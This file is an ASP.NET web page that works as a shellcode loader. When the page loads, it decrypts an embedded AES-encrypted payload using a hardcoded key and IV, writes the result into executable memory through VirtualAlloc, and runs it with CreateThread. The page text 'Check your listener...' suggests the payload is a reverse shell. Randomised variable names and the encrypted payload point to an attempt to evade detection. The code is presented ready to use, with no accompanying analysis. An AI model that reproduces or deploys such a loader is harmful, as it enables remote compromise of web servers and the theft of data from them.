<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    private byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (var aes = Aes.Create())
        {
            aes.KeySize = 256;
            aes.BlockSize = 128;

            // Keep this in mind when you view your decrypted content as the size will likely be different.
            aes.Padding = PaddingMode.Zeros;

            aes.Key = key;
            aes.IV = iv;

            using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
            {
                return PerformCryptography(data, decryptor);
            }
        }
    }

    private byte[] PerformCryptography(byte[] data, ICryptoTransform cryptoTransform)
    {
        using (var ms = new MemoryStream())
        using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
        {
            cryptoStream.Write(data, 0, data.Length);
            cryptoStream.FlushFinalBlock();
            return ms.ToArray();
        }
    }

    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    protected void Page_Load(object sender, EventArgs e)
    {
        // Key bytes
        byte[] Key = new byte[32] {
        0x57, 0xef, 0x18, 0x5a, 0x8f, 0xd4, 0x32, 0xbc, 0x4f, 0x39, 0x66, 0x3f, 0x0c, 0x17, 0x0b,
        0x1e, 0x9e, 0xb4, 0x82, 0x3e, 0x4d, 0x9d, 0xa9, 0x05, 0x90, 0x23, 0xee, 0x03, 0xa7, 0x81,
        0x5f, 0xdd };

        // IV bytes
        byte[] Iv = new byte[16] {
        0x6e, 0x8f, 0xa8, 0xdd, 0xe6, 0x8e, 0xe1, 0x10, 0x63, 0x17, 0x11, 0x02, 0xc8, 0xfb, 0x60,
        0x6b };
        
        byte[] Enc = new byte[688] {
        0x46, 0x68, 0x1d, 0xee, 0x3f, 0x8f, 0xc2, 0xf7, 0xa9, 0xbe, 0x60, 0x3c, 0x40, 0xf0, 0xe4,
        0x24, 0x73, 0xa8, 0xec, 0x2c, 0x5f, 0x31, 0xc2, 0xd5, 0x57, 0x17, 0xd5, 0xf9, 0x8a, 0x4c,
        0xaf, 0x93, 0xd1, 0x4a, 0xb1, 0x2a, 0x9e, 0xb5, 0xd4, 0x67, 0xd7, 0x28, 0xa7, 0xe9, 0x0f,
        0x19, 0x41, 0xfa, 0xd0, 0x42, 0x20, 0x2a, 0xe0, 0x3e, 0x76, 0xaa, 0x46, 0xfb, 0x53, 0xc1,
        0x02, 0xf0, 0x98, 0x2a, 0xb4, 0x9c, 0x9d, 0x7c, 0x37, 0x2d, 0xb4, 0x01, 0x99, 0x88, 0xd6,
        0x2e, 0xe0, 0x40, 0xb0, 0x86, 0x20, 0x64, 0xde, 0xde, 0xad, 0x62, 0x83, 0x92, 0xfb, 0x05,
        0xae, 0xb3, 0xc2, 0x41, 0x9b, 0x4a, 0xe2, 0x2b, 0xc8, 0x09, 0x4c, 0x08, 0x2e, 0x13, 0xd7,
        0x5a, 0x39, 0x5e, 0x24, 0x9c, 0x1c, 0x9a, 0x59, 0x41, 0xdd, 0xbf, 0x70, 0x82, 0x07, 0xae,
        0xde, 0xa9, 0x1d, 0x4b, 0x45, 0xea, 0xf5, 0x30, 0xa0, 0x01, 0x75, 0x84, 0xbf, 0x64, 0xb7,
        0x5b, 0x3b, 0x20, 0xb3, 0xbe, 0x47, 0xf2, 0x76, 0xf5, 0x87, 0xb6, 0xd0, 0xd0, 0xf1, 0x57,
        0x04, 0xd7, 0xe0, 0x00, 0xb4, 0xc8, 0x74, 0x3e, 0x15, 0x84, 0x21, 0xf4, 0x17, 0xae, 0x4a,
        0xd8, 0x22, 0x84, 0x30, 0x2b, 0x02, 0x4b, 0x44, 0xd3, 0x92, 0xfd, 0x11, 0x5e, 0x13, 0xca,
        0x2a, 0x59, 0xd3, 0x38, 0xbb, 0x32, 0xc8, 0x19, 0x00, 0x9a, 0xc2, 0xa1, 0xaa, 0x1c, 0x34,
        0xcc, 0x86, 0xc9, 0xea, 0x7e, 0x71, 0x3a, 0xae, 0x80, 0x74, 0x39, 0x83, 0xbe, 0xf9, 0xc9,
        0x29, 0x0b, 0x22, 0xc7, 0x11, 0x77, 0x04, 0x16, 0x80, 0xd3, 0xc1, 0x5e, 0xd7, 0xab, 0xa5,
        0xb5, 0x5c, 0x57, 0x84, 0xd8, 0xcf, 0x3e, 0x6d, 0xff, 0x79, 0xa5, 0x06, 0xc4, 0xa8, 0xf8,
        0x60, 0x39, 0x8d, 0x13, 0x8a, 0xe5, 0xc3, 0xf3, 0x5c, 0xbe, 0xcd, 0xdf, 0x5a, 0xa1, 0x7d,
        0xbb, 0x2e, 0x60, 0x13, 0x00, 0x0d, 0x9b, 0xb3, 0xbe, 0x10, 0x83, 0xff, 0xb6, 0x1e, 0x2d,
        0xba, 0x70, 0x3b, 0x18, 0xd4, 0x42, 0x57, 0x7f, 0x24, 0x8e, 0x96, 0x9c, 0xbf, 0x33, 0xb2,
        0x0f, 0x12, 0x14, 0xc2, 0x8c, 0x0a, 0x71, 0x99, 0x6c, 0x3a, 0x72, 0x30, 0x92, 0x3b, 0x29,
        0x6f, 0x3c, 0x54, 0x62, 0x0a, 0xee, 0xa6, 0x4e, 0x27, 0x70, 0x94, 0xfb, 0x6c, 0xbc, 0x35,
        0xd5, 0x40, 0xbf, 0xec, 0xc1, 0x47, 0x47, 0xb1, 0x84, 0xca, 0xef, 0x1d, 0x6b, 0x1b, 0x50,
        0xff, 0x2d, 0x18, 0xfe, 0xeb, 0x10, 0xa5, 0x69, 0x03, 0xdf, 0x42, 0xf0, 0x45, 0xde, 0x77,
        0xc7, 0xde, 0x85, 0x98, 0x90, 0xcd, 0x78, 0xa1, 0x34, 0xae, 0xaa, 0x4d, 0x31, 0x46, 0xaf,
        0x2b, 0x35, 0x77, 0xfc, 0x9d, 0x35, 0xdc, 0x04, 0x07, 0xef, 0xb1, 0x2b, 0x60, 0x09, 0x3c,
        0xa9, 0x2c, 0x46, 0xa9, 0x55, 0xe8, 0x34, 0x24, 0x17, 0x85, 0x7f, 0x18, 0x2c, 0x51, 0x71,
        0x29, 0xdd, 0xc1, 0xe6, 0x09, 0x40, 0xf9, 0x9c, 0xb7, 0x76, 0x56, 0xf8, 0x16, 0xd6, 0x97,
        0x0a, 0xf1, 0x8c, 0xb5, 0x23, 0x27, 0x75, 0xab, 0x35, 0x16, 0x7a, 0x27, 0xa5, 0x21, 0x9f,
        0x60, 0xb4, 0x22, 0xbf, 0x3c, 0xaf, 0x66, 0x89, 0x3a, 0xd6, 0xde, 0xa3, 0x7b, 0xf9, 0xc2,
        0x2b, 0xdc, 0x04, 0x95, 0xba, 0x52, 0x94, 0x53, 0x59, 0x05, 0x41, 0x67, 0xf1, 0x34, 0x87,
        0x12, 0x9a, 0x88, 0x10, 0xf2, 0xd0, 0x0e, 0x1a, 0xbe, 0xa8, 0x2e, 0x1c, 0xb0, 0xe8, 0xc9,
        0xcc, 0x08, 0xa7, 0x46, 0x23, 0xe6, 0x7c, 0x2c, 0x67, 0x0c, 0x15, 0x49, 0x90, 0xfe, 0x99,
        0xbc, 0xbd, 0xad, 0xb8, 0x93, 0x80, 0xe7, 0x81, 0x58, 0x9f, 0xa9, 0x4a, 0xea, 0x04, 0x29,
        0x8f, 0xca, 0xf9, 0x6d, 0x68, 0x04, 0x68, 0x72, 0x2d, 0x6c, 0xd3, 0x2a, 0x7c, 0xaa, 0x6a,
        0x66, 0xb2, 0xae, 0xd4, 0x12, 0x0b, 0xf9, 0x9a, 0x4f, 0x32, 0x2f, 0x17, 0xf0, 0x9a, 0x5d,
        0x5b, 0x04, 0x72, 0xb3, 0xca, 0x80, 0x6b, 0x5d, 0x33, 0xb0, 0x58, 0x8b, 0x5b, 0x4d, 0x31,
        0x4e, 0x04, 0x1c, 0x2f, 0xc5, 0x71, 0xcb, 0x88, 0xe3, 0x5f, 0xfa, 0xd6, 0xba, 0xd2, 0x5b,
        0xc9, 0x07, 0x73, 0x2c, 0xca, 0x09, 0x62, 0xf3, 0x28, 0x4a, 0xfa, 0x72, 0x45, 0xea, 0xdb,
        0x62, 0x8b, 0x08, 0xad, 0x16, 0x82, 0xbc, 0x1e, 0x52, 0x37, 0xd0, 0x2a, 0xa3, 0xa9, 0xa5,
        0x7c, 0xac, 0xd4, 0x70, 0x30, 0x16, 0x58, 0xf2, 0x0e, 0xff, 0x48, 0x8c, 0x3c, 0x9d, 0x95,
        0xfe, 0xab, 0x90, 0x0c, 0xe1, 0x02, 0x49, 0x2d, 0x36, 0x8f, 0x13, 0x6b, 0x79, 0xc4, 0x1d,
        0xac, 0x8b, 0xaf, 0x58, 0x6d, 0x6d, 0xdd, 0xf0, 0x54, 0xcd, 0x58, 0xd6, 0x8c, 0x56, 0x31,
        0x54, 0x35, 0x4d, 0x1b, 0x25, 0x32, 0xb8, 0x46, 0xf7, 0x0d, 0x38, 0x6b, 0xba, 0x60, 0x16,
        0x66, 0xb5, 0x1a, 0x07, 0xaf, 0x49, 0x45, 0xc5, 0xd4, 0xe3, 0x79, 0xf9, 0xb5, 0x1c, 0x23,
        0x7b, 0x0b, 0xa5, 0x29, 0x0e, 0x47, 0x33, 0xc1, 0xaf, 0x1b, 0xf5, 0x1c, 0xc0, 0xbc, 0x16,
        0xa7, 0xf5, 0xc4, 0x1b, 0xb1, 0xc2, 0x87, 0xff, 0x74, 0x40, 0x7c, 0xf9, 0x02 };

        byte[] e4qRS= Decrypt(Enc, Key, Iv);

        IntPtr zG5fzCKEhae = VirtualAlloc(IntPtr.Zero,(UIntPtr)e4qRS.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(e4qRS,0,zG5fzCKEhae,e4qRS.Length);
        IntPtr aj5QpPE = IntPtr.Zero;
        IntPtr oiAJp5aJjiZV = CreateThread(IntPtr.Zero,UIntPtr.Zero,zG5fzCKEhae,IntPtr.Zero,0,ref aj5QpPE);
    }
</script>
<!DOCTYPE html>
<html>
<body>
    <p>Check your listener...</p>
</body>
</html>
